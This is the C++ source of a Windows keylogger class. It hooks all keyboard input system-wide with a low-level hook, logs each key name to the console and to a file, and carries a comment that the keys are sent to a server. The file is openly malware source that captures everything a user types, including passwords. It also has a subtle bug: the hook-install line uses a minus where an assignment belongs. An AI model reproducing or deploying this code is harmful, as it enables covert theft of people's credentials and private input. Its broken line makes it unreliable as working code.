#include <iostream>
#include"../lib/Keylogger.hpp"


Keylogger* Keylogger::instance = nullptr;

Keylogger::Keylogger(const std::string& filename)  : fileHandler(filename) {
    instance = this;
}


LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char key[16] = {0};
            GetKeyNameTextA(kbd->scanCode << 16, key, sizeof(key));

            if(instance) {
                std::cout << "Key Pressed: " << key << std::endl;
                instance->fileHandler.writeFile(std::string(key));  // Send to server
            }
        }
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void Keylogger::InstallHook() {
    hook - SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hook) {
        std::cerr << "Failed to install hook!\n";
    }
}


void Keylogger::UninstallHook() {
    if (hook) {
        UnhookWindowsHookEx(hook);
        hook = NULL;
    }
}

void Keylogger::Run() {
    InstallHook();
    std::cout << "Press ESC to exit." << std::endl;
    MSG msg;
    while (true) {
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                break;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        if (GetAsyncKeyState(VK_ESCAPE)) {
            break;
        }
    }
    UninstallHook();
}